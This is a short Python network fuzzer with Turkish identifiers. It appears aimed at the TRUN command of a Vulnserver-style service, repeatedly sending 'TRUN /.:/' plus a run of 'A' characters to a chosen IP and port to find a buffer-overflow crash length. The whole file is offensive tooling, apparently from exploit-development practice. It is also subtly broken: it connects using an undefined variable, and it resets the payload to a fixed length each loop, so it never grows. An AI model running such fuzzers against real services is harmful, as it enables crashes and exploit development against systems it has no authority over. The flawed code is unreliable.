import socket
import time
import sys
import optparse
from optparse import OptionParser
import subprocess

Parser = OptionParser()
Parser.add_option("-i", "--ip_adres", dest="ip", help="\tip adresi degeri")
Parser.add_option("-p", "--port", dest="port", help="\tport numarası degeri")

(kullanici_girdisi, arguments) = Parser.parse_args()
ip_adresi = kullanici_girdisi.ip
portu = int(kullanici_girdisi.port)

veri_gonder = "TRUN /.:/" + "A" * 100

while True:
    try:
        baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baglanti.connect((str(ip), portu))
        veri_isle = veri_gonder.encode(encoding="latin1")
        baglanti.send(veri_isle)
        veri_gonder = "TRUN /.:/" + "A" * 100
        time.sleep(1)
        baglanti.close()

    except KeyboardInterrupt:
        subprocess.call(["clear"])
        print("'CTRL + C' basildi\ntahmini veri araligi : " + str(len(veri_gonder)))
        sys.exit()

    except TypeError:
        subprocess.call(["clear"])
        print("tahmini veri araligi : " + str(len(veri_gonder)))
        sys.exit()

    except Exception as E:
        subprocess.call(["clear"])
        print(E)
        print("tahmini veri araligi : " + str(len(veri_gonder)))
        sys.exit()
